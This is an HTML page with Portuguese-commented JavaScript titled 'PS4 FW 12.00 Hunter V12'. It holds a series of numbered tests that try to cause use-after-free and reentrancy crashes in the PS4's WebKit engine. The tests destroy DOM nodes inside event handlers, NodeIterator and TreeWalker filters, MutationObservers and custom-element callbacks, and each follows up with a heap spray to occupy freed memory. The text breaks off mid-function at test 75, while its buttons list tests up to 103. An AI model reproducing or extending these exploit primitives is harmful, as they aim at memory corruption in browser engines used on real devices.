<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 FW 12.00 :: Hunter V12 (Chaos Logic)</title>
    
</head>
<body>

    <h1>PS4 V12: CHAOS THEORY</h1>
    <p>Alvos: DOMNodeRemoved, Table Thrashing & Iframe Detach</p>

    <button onclick="runTest54()">TEST 54: The "Sync-Delete" Trap (DOMNodeRemoved)</button>
    <button onclick="runTest55()">TEST 55: Iframe Zombie Window (Lifecycle Race)</button>
    <button onclick="runTest56()">TEST 56: Table Layout Confusion (Bad Parent)</button>
    <button onclick="runTest57()">TEST 57: Range Extraction Mutation (Split Tree)</button>
    <button onclick="runTest58()">TEST 58: Array Length ReadOnly Lock</button>
        <button onclick="runTest59()">TEST 59: NodeIterator Filter Suicide (Reentrancy)</button>
        <button onclick="runTest60()">TEST 60: adoptNode() Document Destruction</button>
        <button onclick="runTest61()">TEST 61: Focus Manager 'Blur-to-Death'</button>
        <button onclick="runTest62()">TEST 62: Select Option Array Reentrancy</button>
        <button onclick="runTest63()">TEST 63: TreeWalker 'CurrentNode' Removal Trap</button>
        <button onclick="runTest64()">TEST 64: deleteMedium Mutation Trap</button>
        <button onclick="runTest65()">TEST 65: CSS Counter RenderObject UAF</button>
        <button onclick="runTest66()">TEST 66: Text.splitText() Observer Race</button>
        <button onclick="runTest67()">TEST 67: Select.add() Proxy Confusion</button>
        <button onclick="runTest68()">TEST 68: Range.surroundContents() Destruction</button>
        <button onclick="runTest69()">TEST 69: Custom Element 'Adopt' Suicide</button>
        <button onclick="runTest70()">TEST 70: replaceChild Recursive Swap</button>
        <button onclick="runTest71()">TEST 71: TreeWalker Root Detachment</button>
        <button onclick="runTest72()">TEST 72: Range Insert Fragmentation (UAF)</button>
        <button onclick="runTest73()">TEST 73: NodeFilter Type Confusion</button>
        <button onclick="runTest74()">TEST 74: Layout Reentrancy (Filter + Offset)</button>
        <button onclick="runTest75()">TEST 75: Selection.modify() Mutation Trap</button>
        <button onclick="runTest76()">TEST 76: Style Sheet Thrashing (UAF)</button>
        <button onclick="runTest77()">TEST 77: Form 'Invalid' Event Destruction</button>
        <button onclick="runTest78()">TEST 78: Details 'Toggle' Event Loop</button>
        <button onclick="runTest80()">TEST 80: IntersectionObserver Lifetime Race</button>
        <button onclick="runTest81()">TEST 81: CSS Variable Cyclic Dependency Crash</button>
        <button onclick="runTest82()">TEST 82: SVG 'use' Shadow Tree Re-Entrancy</button>
        <button onclick="runTest83()">TEST 83: Slot Element Assignment Confusion</button>
        <button onclick="runTest84()">TEST 84: Template Content Adoption Cycle</button>
        <button onclick="runTest85()">TEST 85: Dataset (DOMStringMap) Proxy UAF</button>
        <button onclick="runTest86()">TEST 86: XHR ResponseType Confusion Race</button>
        <button onclick="runTest87()">TEST 87: FontFaceSet Iterator Invalidation</button>
        <button onclick="runTest88()">TEST 88: SVG SMIL Animation Target Death</button>
        <button onclick="runTest89()">TEST 89: Normalize() Text Merge Trap</button>
        <button onclick="runTest90()">TEST 90: Selection.extend() DOM Mutation</button>
        <button onclick="runTest91()">TEST 91: CSS 'content' Counter Layout Loop</button>
        <button onclick="runTest92()">TEST 92: Form NamedItem Getter Destruction</button>
        <button onclick="runTest93()">TEST 93: Range.insertNode() Hierarchy Cycle</button>
        <button onclick="runTest94()">TEST 94: Gamepad Object UAF (PS4 Controller)</button>
        <button onclick="runTest95()">TEST 95: MessagePort Transfer Getter Trap</button>
        <button onclick="runTest96()">TEST 96: deleteFromDocument Selection Crash</button>
        <button onclick="runTest97()">TEST 97: Canvas.toBlob() Destruction Race</button>
        <button onclick="runTest98()">TEST 98: MatchMedia Listener Detach</button>
        <button onclick="runTest99()">TEST 99: Serialized History State UAF (The Ghost)</button>
        <button onclick="runTest100()">TEST 100: Transferable ArrayBuffer Detach Race</button>
        <button onclick="runTest101()">TEST 101: Cyclic SVG Filter Rendering Crash</button>
        <button onclick="runTest102()">TEST 102: FontFaceSet Iterator Invalidation Loop</button>
        <button onclick="runTest103()">TEST 103: TextNode Split/Merge Feng Shui (Target 0xFF)</button>

    <div id="log">Aguardando execução...</div>

    <script>
        function log(msg) {
            const l = document.getElementById('log');
            l.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
            l.scrollTop = l.scrollHeight;
        }

        // --- HEAP SPRAY GLOBAL ---
        // Padrão 0xBB (187) para identificar facilmente no dump se houver crash
        var sprayStore = [];
        function sprayHeap() {
            try {
                // Alocação mista para tentar ocupar buracos de tamanhos variados
                for(let i=0; i<4000; i++) {
                    let b = new Uint8Array(128); 
                    b.fill(0xBB); 
                    sprayStore.push(b);
                    
                    // Objetos com ponteiros inline
                    let o = {a: 1, b: 2, c: document.body}; 
                    sprayStore.push(o);
                }
            } catch(e) {}
        }

        // --- TESTE 54: The "Sync-Delete" Trap ---
        // Lógica: O evento DOMNodeRemoved dispara *antes* do nó sair.
        // Se o C++ estiver iterando uma lista para remover filhos, e nós usarmos
        // esse evento para remover o *próximo* filho da lista manualmente,
        // o ponteiro do iterador C++ se torna inválido (Use-After-Free).
        function runTest54() {
            log("Iniciando Test 54: DOMNodeRemoved Chaos...");
            
            let container = document.createElement('div');
            let child1 = document.createElement('div');
            let child2 = document.createElement('div');
            let child3 = document.createElement('div');
            
            container.appendChild(child1);
            container.appendChild(child2);
            container.appendChild(child3);
            document.body.appendChild(container);

            // A armadilha
            function trap(e) {
                if (e.target === child1) {
                    log("Trap disparada na remoção do Child 1!");
                    
                    // O C++ acha que a lista é [Child1, Child2, Child3]
                    // Ele está processando Child1. O próximo seria Child2.
                    
                    // Nós destruímos a estrutura da lista agora:
                    try {
                        // Removemos o Child2 (que seria o próximo)
                        container.removeChild(child2);
                        // E o Child3 para garantir confusão
                        container.removeChild(child3);
                        
                        // Enchemos a memória onde Child2 estava
                        sprayHeap();
                        
                        log("Estrutura alterada dentro do evento.");
                    } catch(err) {
                        log("Erro na trap: " + err);
                    }
                }
            }

            container.addEventListener('DOMNodeRemoved', trap);

            // GATILHO: Limpar o container.
            // O navegador vai tentar iterar e remover todos os filhos.
            log("Disparando innerHTML = ''...");
            container.innerHTML = "";
            
            // Se chegamos aqui sem crash, verificamos se sobrou lixo
            if (child2.parentNode) log("Child2 ainda tem pai? (Inesperado)");
            else log("Teste 54 concluído (Sem crash imediato).");
        }

        // --- TESTE 55: Iframe Zombie Window ---
        // Lógica: Iframes possuem um objeto 'window' (proxy).
        // Quando o iframe é removido, o objeto window deve ser "desconectado".
        // Se conseguirmos acessar uma propriedade do window *durante* ou *logo após* a desconexão,
        // mas antes do Garbage Collector limpar o objeto C++ real...
        function runTest55() {
            log("Iniciando Test 55: Iframe Zombie...");
            
            let f = document.createElement('iframe');
            f.onload = function() {
                let win = f.contentWindow;
                
                // Define algo para rastrear
                win.my_prop = "teste";
                
                log("Removendo Iframe e acessando Window em loop...");
                f.remove();
                
                // Tenta acessar o objeto morto imediatamente
                sprayHeap();
                
                try {
                    // Tenta invocar método nativo em objeto desconectado
                    // Isso força o proxy a tentar resolver o ponteiro C++ subjacente
                    let dead = win.document; 
                    log("Acesso a document morto: " + dead);
                    
                    win.history.replaceState(null, null, "zombie");
                } catch(e) {
                    log("Erro esperado (Safe): " + e.message);
                }
            };
            document.body.appendChild(f);
        }

        // --- TESTE 56: Table Layout Confusion ---
        // Lógica: Tabelas têm uma árvore de renderização complexa.
        // Se movermos uma célula de uma linha para outra, e deletarmos a linha antiga
        // sem dar tempo para o navegador recalcular o layout ("dirty layout"),
        // podemos causar um crash na engine de renderização ao acessar propriedades geométricas.
        function runTest56() {
            log("Iniciando Test 56: Table Thrashing...");
            
            let table = document.createElement('table');
            let rowA = table.insertRow();
            let cell = rowA.insertCell();
            cell.innerHTML = "<b>MOVE ME</b>";
            
            let rowB = table.insertRow();
            document.body.appendChild(table);
            
            // Força cálculo inicial de layout
            let w1 = table.offsetWidth; 
            
            log("Movendo célula e destruindo pai original...");
            
            // 1. Move a célula (DOM Operation)
            rowB.appendChild(cell);
            
            // 2. Destroi a linha antiga (Causa 'dirty' state na tabela)
            rowA.remove();
            rowA = null;
            
            // 3. Spray para ocupar memória da RowA
            sprayHeap();
            
            // 4. FORÇA o layout a ler a árvore suja
            // O navegador precisa calcular a largura da célula. 
            // Se ele tentar olhar quem era o "pai anterior" ou se perder na árvore...
            try {
                let w2 = cell.offsetLeft; 
                log("Layout forçado. Offset: " + w2);
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 57: Range Extraction Mutation ---
        // Lógica: 'extractContents' é destrutivo. Ele corta o DOM.
        // Usamos um MutationObserver para detectar quando o corte começa.
        // No meio do corte, nós bagunçamos o DOM ainda mais.
        function runTest57() {
            log("Iniciando Test 57: Range Extract...");
            
            let div = document.createElement('div');
            div.innerHTML = "<span>Part1</span><span>Part2</span><span>Part3</span>";
            document.body.appendChild(div);
            
            let range = document.createRange();
            range.selectNodeContents(div);
            
            let observer = new MutationObserver(function() {
                log("Observer: O navegador começou a extrair!");
                // O navegador está no meio de um loop 'for' interno movendo nós.
                // Nós limpamos o resto do div brutalmente.
                div.innerHTML = ""; 
                sprayHeap();
            });
            
            observer.observe(div, {childList: true, subtree: true});
            
            try {
                log("Chamando extractContents()...");
                // Isso deve disparar o observer logo no primeiro nó removido
                let frag = range.extractContents();
                log("Extração finalizada.");
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 58: Array Length ReadOnly Lock ---
        // Lógica: Tentamos enganar o "Fast Path" de arrays.
        // Definimos 'length' como somente leitura. Depois usamos 'push'.
        // Em algumas versões, o 'push' assume que pode crescer o array e ignora a flag readonly,
        // corrompendo o cabeçalho do objeto Array.
        function runTest58() {
            log("Iniciando Test 58: Array Lock...");
            
            var arr = [1];
            // Tenta travar a propriedade length
            Object.defineProperty(arr, "length", { writable: false, value: 1 });
            
            try {
                log("Tentando push em array travado...");
                arr.push(2);
                
                // Se chegou aqui, o push funcionou (o que já é um bug lógico)
                // Vamos ver se a memória corrompeu
                log("Push aceito! Length: " + arr.length);
                if (arr.length > 1000 || arr[1] === undefined) {
                    log("ALERTA: Comportamento anômalo detectado!");
                }
            } catch(e) {
                log("Erro capturado (Correto): " + e.message);
            }
        }
// --- TESTE 59: NodeIterator Filter Suicide ---
        // O Iterator percorre o DOM. Ele aceita uma função de filtro JS.
        // Essa função roda DENTRO do loop C++ do WebKit.
        // Se removermos o nó que está sendo visitado DE DENTRO do filtro, o loop C++ pode falhar.
        function runTest59() {
            log("Iniciando Test 59: Iterator Filter Reentrancy...");
            
            let root = document.createElement('div');
            let child = document.createElement('span');
            root.appendChild(child);
            document.body.appendChild(root);

            // Filtro malicioso
            const filter = {
                acceptNode: function(node) {
                    if (node === child) {
                        log("Filtro ativo no nó filho! Destruindo nó...");
                        
                        // O C++ está "segurando" este nó para perguntar se aceita.
                        // Nós removemos o nó da árvore.
                        root.removeChild(child);
                        
                        // E removemos o pai também para garantir caos
                        root.remove();
                        
                        // Spray para preencher a memória
                        sprayHeap();
                        
                        return NodeFilter.FILTER_ACCEPT;
                    }
                    return NodeFilter.FILTER_SKIP;
                }
            };

            let ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, filter);
            
            try {
                log("Avançando iterador...");
                // nextNode chama o filtro (nosso código JS)
                let res = ni.nextNode(); // root
                let res2 = ni.nextNode(); // child (deve disparar o ataque)
                
                log("Sobreviveu. Resultado: " + res2);
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 60: adoptNode() Document Destruction ---
        // 'adoptNode' move um nó de um documento para outro.
        // Se usarmos um evento que dispara durante a adoção (como DOMNodeRemoved)
        // para destruir o documento de DESTINO, o nó fica num limbo?
        function runTest60() {
            log("Iniciando Test 60: adoptNode Limbo...");
            
            let iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            let targetDoc = iframe.contentDocument;
            
            let node = document.createElement('div');
            document.body.appendChild(node);

            // Trap de remoção
            node.addEventListener('DOMNodeRemoved', function() {
                log("Nó sendo removido para adoção. Destruindo documento de destino...");
                
                // O nó está saindo do 'document' principal e indo para 'targetDoc'.
                // Nós matamos o 'targetDoc' removendo o iframe.
                iframe.remove();
                
                // Força GC no documento morto
                targetDoc = null;
                sprayHeap();
            });

            try {
                // Tenta adotar o nó no documento que acabamos de marcar para morte
                targetDoc.adoptNode(node);
                log("Adoção concluída (ou falhou silenciosamente).");
            } catch(e) {
                log("Erro (Safe): " + e.message);
            }
        }

        // --- TESTE 61: Focus Manager 'Blur-to-Death' ---
        // O gerenciador de foco é complexo.
        // Focamos um input. No evento 'blur', limpamos o mundo.
        // Quando removemos o input, o 'blur' dispara SINCORNAMENTE.
        // O navegador ainda está tentando processar a remoção do input.
        function runTest61() {
            log("Iniciando Test 61: Focus Manager...");
            
            let input = document.createElement('input');
            document.body.appendChild(input);
            input.focus();
            
            input.onblur = function() {
                log("Blur disparado! Destruindo DOM inteiro...");
                // Limpa o corpo do documento, destruindo o próprio input (novamente?) e tudo ao redor
                document.body.innerHTML = "";
                
                // Spray agressivo
                sprayHeap();
                
                // Tenta criar confusão de foco
                let temp = document.createElement('button');
                document.body.appendChild(temp);
                temp.focus();
            };

            log("Removendo elemento focado...");
            // Isso deve disparar onblur imediatamente
            input.remove();
            
            log("Teste 61 fim.");
        }

        // --- TESTE 62: Select Option Array Reentrancy ---
        // Manipular o comprimento (length) de um <select> redimensiona o array de opções interno.
        // Se usarmos 'DOMNodeRemoved' em uma opção para alterar o length do select NOVAMENTE,
        // causamos reentrância no redimensionador de array.
        function runTest62() {
            log("Iniciando Test 62: Select Array Reentrancy...");
            
            let s = document.createElement('select');
            // Cria 100 opções
            for(let i=0; i<100; i++) {
                let o = document.createElement('option');
                s.appendChild(o);
            }
            document.body.appendChild(s);

            // Adiciona listener na opção 90
            s.options[90].addEventListener('DOMNodeRemoved', function() {
                log("Opção 90 sendo removida. Zerando Select...");
                
                // Estamos no meio do processo de reduzir o tamanho de 100 para 50.
                // O motor C++ está num loop. Nós interrompemos e mudamos o tamanho para 0.
                s.length = 0; 
                
                sprayHeap();
            });

            log("Reduzindo length de 100 para 50...");
            // Isso vai remover as opções de 50 a 99 sequencialmente.
            // Quando chegar na 90, nossa trap dispara.
            s.length = 50;
            
            log("Length final: " + s.length);
        }

        // --- TESTE 63: TreeWalker 'CurrentNode' Removal Trap ---
        // TreeWalker mantém um ponteiro para 'currentNode'.
        // Se removermos esse nó, o TreeWalker tenta atualizar o ponteiro.
        // Se manipularmos o DOM durante essa atualização (via evento DOMNodeRemoved do nó),
        // podemos confundir a lógica de "onde devo pousar agora?".
        function runTest63() {
            log("Iniciando Test 63: TreeWalker Fixup...");
            
            let root = document.createElement('div');
            let n1 = document.createElement('div'); // Sibling anterior
            let n2 = document.createElement('div'); // Alvo (Current)
            let n3 = document.createElement('div'); // Sibling posterior
            
            root.appendChild(n1);
            root.appendChild(n2);
            root.appendChild(n3);
            document.body.appendChild(root);
            
            let tw = document.createTreeWalker(root, NodeFilter.SHOW_ALL);
            tw.currentNode = n2; // Aponta para o meio
            
            n2.addEventListener('DOMNodeRemoved', function() {
                log("Nó atual sendo removido. Destruindo siblings...");
                // O TreeWalker vai tentar pular para n1 ou n3 quando n2 morrer.
                // Nós matamos n1 e n3 AGORA.
                n1.remove();
                n3.remove();
                sprayHeap();
            });
            
            log("Removendo currentNode (n2)...");
            n2.remove();
            
            // Onde está o walker agora?
            try {
                log("Walker node tag: " + tw.currentNode.tagName);
                // Se apontar para n1 ou n3 (que foram removidos), temos um ponteiro para nó morto.
                if (tw.currentNode === n1 || tw.currentNode === n3) {
                    log("PERIGO: Walker aponta para nó removido!");
                }
            } catch(e) {
                log("Erro: " + e);
            }
        }
// --- TESTE 64: deleteMedium Mutation Trap ---
        // Alvo: "deleteMedium" (Listado no seu arquivo).
        // Lógica: Este comando edita o DOM. Se usarmos um evento de mutação de texto
        // para destruir o nó que está sendo editado, o editor C++ perde a referência.
        function runTest64() {
            log("Iniciando Test 64: deleteMedium Trap...");
            
            let div = document.createElement('div');
            div.contentEditable = true;
            div.innerHTML = "ALVO_DE_TESTE";
            document.body.appendChild(div);
            
            let textNode = div.firstChild;
            
            // Seleciona o texto
            let sel = window.getSelection();
            let range = document.createRange();
            range.selectNodeContents(div);
            sel.removeAllRanges();
            sel.addRange(range);

            // Observa mudanças nos dados de caractere
            let observer = new MutationObserver(function() {
                log("Observer: Texto mudando! Destruindo editor...");
                div.remove(); // Remove o elemento editável
                textNode = null;
                sprayHeap();
            });
            
            observer.observe(div, {characterData: true, subtree: true});

            try {
                log("Executando deleteMedium...");
                // deleteMedium tenta apagar a seleção. O observer dispara no meio.
                document.execCommand('deleteMedium');
                log("Comando finalizado.");
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 65: CSS Counter RenderObject UAF ---
        // Lógica: Contadores CSS dependem da árvore de renderização.
        // Se forçarmos um recálculo de estilo (getComputedStyle) dentro de um evento
        // de remoção que altera a estrutura da lista, podemos corromper o RenderCounter.
        function runTest65() {
            log("Iniciando Test 65: CSS Counter UAF...");
            
            let style = document.createElement('style');
            style.textContent = `
                .list-item { counter-increment: my-counter; }
                .list-item::before { content: counter(my-counter); }
            `;
            document.head.appendChild(style);

            let list = document.createElement('div');
            let item1 = document.createElement('div');
            let item2 = document.createElement('div');
            let item3 = document.createElement('div');
            
            item1.className = item2.className = item3.className = "list-item";
            list.appendChild(item1);
            list.appendChild(item2);
            list.appendChild(item3);
            document.body.appendChild(list);

            // Força layout inicial
            getComputedStyle(item3).content;

            item2.addEventListener('DOMNodeRemoved', function() {
                log("Removendo item 2. Forçando update de contadores...");
                
                // Removemos o item 3 também, que depende do valor do item 2
                list.removeChild(item3);
                sprayHeap();
                
                // Força o navegador a recalcular os contadores AGORA,
                // enquanto a árvore está num estado inconsistente.
                try {
                    // Acessar offsetHeight força reflow
                    let h = list.offsetHeight;
                    log("Reflow forçado: " + h);
                } catch(e) {}
            });

            log("Removendo item2 (Trigger)...");
            list.removeChild(item2);
        }

        // --- TESTE 66: Text.splitText() Observer Race ---
        // Lógica: 'splitText' divide um nó de texto em dois.
        // O DOM muda imediatamente. O MutationObserver pega isso.
        // Se dentro do observer nós fizermos 'normalize()' (que junta de novo),
        // o valor de retorno de 'splitText' (o novo nó) pode apontar para memória liberada.
        function runTest66() {
            log("Iniciando Test 66: splitText/Normalize Race...");
            
            let div = document.createElement('div');
            let text = document.createTextNode("SPLIT_ME");
            div.appendChild(text);
            document.body.appendChild(div);

            let observer = new MutationObserver(function(mutations) {
                log("Observer: splitText ocorreu. Revertendo com normalize()...");
                
                // normalize() vai fundir os nós de texto de volta e destruir o segundo nó.
                div.normalize();
                
                // Spray para ocupar o espaço do nó destruído
                sprayHeap();
            });
            
            observer.observe(div, {childList: true});

            try {
                // splitText retorna o NOVO nó criado.
                // Mas nosso observer já rodou e o destruiu via normalize().
                let newNode = text.splitText(5);
                
                log("Acessando nó retornado (deveria estar morto)...");
                // Acesso UAF?
                newNode.data = "CRASH"; 
                log("Sobreviveu. Data: " + newNode.data);
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 67: Select.add() Proxy Confusion ---
        // Lógica: O método 'add' de um Select espera um elemento Option.
        // Se passarmos um Proxy, podemos interceptar a leitura de propriedades
        // e destruir o Select antes que o elemento seja inserido.
        function runTest67() {
            log("Iniciando Test 67: Select.add Proxy...");
            
            let select = document.createElement('select');
            document.body.appendChild(select);
            
            // Criamos um Option falso
            let evilOption = document.createElement('option');
            
            // Proxy para detectar quando o C++ lê o 'nodeType' ou similar
            let proxy = new Proxy(evilOption, {
                get: function(target, prop) {
                    if (prop === "nodeType") {
                        log("C++ lendo nodeType. Destruindo Select...");
                        select.remove();
                        select = null;
                        sprayHeap();
                        return 1; // Element Node
                    }
                    return Reflect.get(target, prop);
                }
            });

            try {
                log("Adicionando Proxy ao Select...");
                // O método add verifica se é um elemento válido. O Proxy intercepta.
                select.add(proxy);
                log("Adição concluída.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 68: Range.surroundContents() Destruction ---
        // Lógica: 'surroundContents' move o conteúdo do Range para dentro de um novo nó.
        // Se o novo nó disparar um evento ao ser inserido (DOMNodeInserted) e
        // nesse evento nós destruirmos o Range ou o conteúdo original...
        function runTest68() {
            log("Iniciando Test 68: Range surroundContents...");
            
            let p = document.createElement('p');
            p.innerHTML = "TEXTO PARA ENVOLVER";
            document.body.appendChild(p);
            
            let range = document.createRange();
            range.selectNodeContents(p);
            
            let wrapper = document.createElement('div');
            
            // Armadilha de inserção
            wrapper.addEventListener('DOMNodeInserted', function() {
                log("Wrapper sendo inserido. Detonando conteúdo original...");
                // O navegador está movendo "TEXTO PARA ENVOLVER" para dentro do Wrapper.
                // Nós removemos o Wrapper do DOM antes do processo terminar.
                wrapper.remove();
                p.remove();
                sprayHeap();
            });
            
            try {
                log("Executando surroundContents...");
                // Isso deve mover o texto para dentro do wrapper, e inserir o wrapper no p.
                range.surroundContents(wrapper);
                log("Operação finalizada.");
            } catch(e) {
                log("Erro: " + e);
            }
        }
// --- TESTE 69: Custom Element 'Adopt' Suicide ---
        // Custom Elements têm callbacks de ciclo de vida.
        // 'adoptedCallback' roda quando o nó muda de documento.
        // Se destruirmos o nó DENTRO do callback de adoção, o 'adoptNode' retorna o quê?
        function runTest69() {
            log("Iniciando Test 69: CE Adopt Suicide...");

            if (!window.customElements) { log("Custom Elements não suportados."); return; }

            class SuicideNode extends HTMLElement {
                adoptedCallback() {
                    log("Callback de Adoção! Cometiendo suicídio...");
                    // O navegador está movendo este nó. Nós o removemos do fluxo.
                    this.remove(); 
                    sprayHeap();
                }
            }
            
            // Define elemento único para evitar conflito de nomes
            const name = "x-suicide-" + Math.floor(Math.random()*10000);
            customElements.define(name, SuicideNode);

            let iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            let otherDoc = iframe.contentDocument;

            let el = document.createElement(name);
            document.body.appendChild(el);

            try {
                log("Adotando nó em outro documento...");
                // O WebKit move o nó. O callback dispara. O nó morre.
                // O WebKit tenta retornar o nó e inseri-lo na lista de documentos adotados.
                let adopted = otherDoc.adoptNode(el);
                
                log("Adoção retornou. Verificando integridade...");
                if (adopted.parentNode) log("ParentNode existe (Estranho).");
                else log("Nó órfão (Esperado).");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
            
            iframe.remove();
        }

        // --- TESTE 70: replaceChild Recursive Swap ---
        // 'replaceChild(new, old)' dispara evento de remoção no 'old'.
        // Se no handler de remoção nós substituirmos o 'new' (que ainda está entrando) por outro nó...
        function runTest70() {
            log("Iniciando Test 70: Recursive Replace...");
            
            let container = document.createElement('div');
            let oldNode = document.createElement('div');
            let newNode = document.createElement('div');
            let thirdNode = document.createElement('div');
            
            container.appendChild(oldNode);
            document.body.appendChild(container);

            oldNode.addEventListener('DOMNodeRemoved', function() {
                log("OldNode removido. Trocando NewNode antes dele entrar...");
                
                // O motor C++ tem ponteiros para 'oldNode' e 'newNode'.
                // Nós tentamos invalidar 'newNode' substituindo-o em outro contexto ou limpando referências.
                try {
                    // Tentativa de confundir o pai sobre quem é filho de quem
                    // Substitui o newNode (que nem entrou ainda??) por thirdNode?
                    // Não, o newNode ainda não tem pai.
                    
                    // Estratégia: Esvaziar o container para que ele perca a referência do local de inserção
                    container.textContent = ""; 
                    sprayHeap();
                    
                    // Adiciona o newNode em OUTRO lugar para mudar seu estado de ponteiro
                    document.body.appendChild(newNode);
                } catch(e) { log("Erro trap: " + e); }
            });

            try {
                // Substitui old por new
                // O evento dispara. O container é esvaziado. O newNode vai pro body.
                // O replaceChild tenta terminar a inserção do newNode no container.
                container.replaceChild(newNode, oldNode);
                log("Replace finalizado.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 71: TreeWalker Root Detachment ---
        // TreeWalker é criado com uma Raiz. Se a Raiz for removida do documento,
        // o Walker continua funcionando? E se removermos o nó ATUAL da Raiz desconectada?
        function runTest71() {
            log("Iniciando Test 71: TreeWalker Detach...");
            
            let root = document.createElement('div');
            let child = document.createElement('p');
            root.appendChild(child);
            document.body.appendChild(root);
            
            let tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
            tw.nextNode(); // Vai para child
            
            log("Walker no child. Removendo ROOT do documento...");
            root.remove(); // Agora a árvore está flutuando (Detached)
            
            log("Removendo CHILD da ROOT desconectada...");
            root.removeChild(child); // Agora child não tem pai
            
            sprayHeap();
            
            // O Walker está apontando para 'child' (que não tem pai e nem documento)
            // A raiz do Walker é 'root' (que não tem filho nem documento)
            try {
                log("Tentando mover Walker na árvore quebrada...");
                // O algoritmo de travessia tenta subir para o pai. Child não tem pai.
                // Ele tenta checar se Child == Root. Não é.
                let node = tw.parentNode(); 
                log("ParentNode retornou: " + node);
                
                // Tenta nextNode a partir do limbo
                let next = tw.nextNode();
                log("NextNode retornou: " + next);
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 72: Range Insert Fragmentation ---
        // 'insertNode' insere um nó no início do Range.
        // Se inserirmos um DocumentFragment contendo um Custom Element que roda script,
        // podemos destruir o Range ou o Container DURANTE a iteração de inserção dos filhos do fragmento.
        function runTest72() {
            log("Iniciando Test 72: Range Insert UAF...");
            
            if (!window.customElements) { log("CE ausente."); return; }

            let container = document.createElement('div');
            container.innerHTML = "AB";
            document.body.appendChild(container);
            
            let range = document.createRange();
            range.setStart(container.firstChild, 1); // Entre A e B
            range.collapse(true);

            class BombNode extends HTMLElement {
                connectedCallback() {
                    log("BombNode conectado! Destruindo container...");
                    // O fragmento tinha vários nós. Este é um deles.
                    // O WebKit está iterando o fragmento e inserindo um por um.
                    // Nós removemos o container onde a inserção está ocorrendo.
                    container.remove();
                    sprayHeap();
                }
            }
            const bombName = "x-bomb-" + Math.floor(Math.random()*10000);
            customElements.define(bombName, BombNode);

            let frag = document.createDocumentFragment();
            frag.appendChild(document.createElement('span')); // Nó inofensivo
            frag.appendChild(document.createElement(bombName)); // A Bomba
            frag.appendChild(document.createElement('b')); // Nó que o WebKit tentará inserir depois da bomba

            try {
                log("Inserindo fragmento...");
                range.insertNode(frag);
                log("Inserção concluída.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 73: NodeFilter Type Confusion ---
        // Passar um objeto que NÃO é uma função como filtro, mas tem a propriedade 'acceptNode'.
        // E essa propriedade é um Getter que causa efeitos colaterais.
        function runTest73() {
            log("Iniciando Test 73: NodeFilter Getter...");
            
            let root = document.createElement('div');
            root.innerHTML = "<span>Test</span>";
            
            let evilFilter = {
                get acceptNode() {
                    log("Browser pediu o filtro. Mudando tipo...");
                    // No meio da verificação de tipo, nós alteramos o objeto ou o DOM
                    root.innerHTML = ""; // Esvazia o DOM sendo iterado
                    sprayHeap();
                    
                    return function() { return NodeFilter.FILTER_ACCEPT; };
                }
            };

            let tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, evilFilter);
            
            try {
                log("Iniciando travessia...");
                tw.nextNode(); 
                log("Travessia OK.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
 // --- TESTE 74: Layout Reentrancy (Filter + Offset) ---
        // Técnica Atual: Forçar um Recálculo de Layout (Síncrono) dentro de um callback
        // que roda durante a travessia do DOM. O motor de renderização não espera
        // que o layout mude enquanto ele caminha pela árvore.
        function runTest74() {
            log("Iniciando Test 74: Layout Reentrancy...");
            
            let root = document.createElement('div');
            root.innerHTML = "<div id='target'>Target</div>";
            document.body.appendChild(root);
            
            let target = document.getElementById('target');

            const filter = {
                acceptNode: function(node) {
                    if (node === target) {
                        log("Filtro: Forçando Layout Recalc...");
                        
                        // 1. Mutação: Removemos o nó que estamos visitando
                        root.removeChild(target);
                        
                        // 2. Ocupamos a memória
                        sprayHeap();
                        
                        // 3. O GOLPE: Forçamos o motor a calcular geometria AGORA.
                        // Como a árvore está suja (nó removido), ele tenta recalcular.
                        // Mas ele ainda está "dentro" do iterador que aponta para o nó removido.
                        try {
                            let h = document.body.offsetHeight; // Trigger de Layout
                            log("Layout forçado: " + h);
                        } catch(e) {}
                        
                        return NodeFilter.FILTER_ACCEPT;
                    }
                    return NodeFilter.FILTER_SKIP;
                }
            };

            let tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, filter);
            
            try {
                log("Caminhando...");
                tw.nextNode(); // root
                tw.nextNode(); // target -> TRIGGER
                log("Caminhada segura.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 75: Selection.modify() Mutation Trap ---
        // Técnica: A API `Selection.modify` move o cursor. Isso envolve ler o texto
        // e calcular posições. Se alterarmos o texto durante a leitura (via evento),
        // o cursor pode cair num offset inválido.
        function runTest75() {
            log("Iniciando Test 75: Selection Modify...");
            
            let div = document.createElement('div');
            div.contentEditable = true;
            div.innerText = "MOVE_THE_CURSOR_HERE";
            document.body.appendChild(div);
            
            // Foca e coloca cursor no início
            div.focus();
            let sel = window.getSelection();
            sel.collapse(div.firstChild, 0);

            // Armadilha: DOMCharacterDataModified é disparado se mudarmos o texto
            // Mas Selection.modify apenas LÊ. Como disparar a armadilha?
            // Usamos um evento de 'beforeinput' ou similar se disponível, 
            // ou um Timer extremamente agressivo para tentar Race Condition.
            
            // Tática de Race Condition Síncrona (se possível) ou Loop apertado.
            let observer = new MutationObserver(() => {
                log("Observer disparado! Destruindo texto...");
                div.innerText = ""; // Esvazia
                sprayHeap();
            });
            observer.observe(div, {characterData: true, subtree: true});

            // Trigger: Vamos tentar deletar e mover ao mesmo tempo?
            // Executamos um comando que edita E move.
            try {
                log("Executando ForwardDelete...");
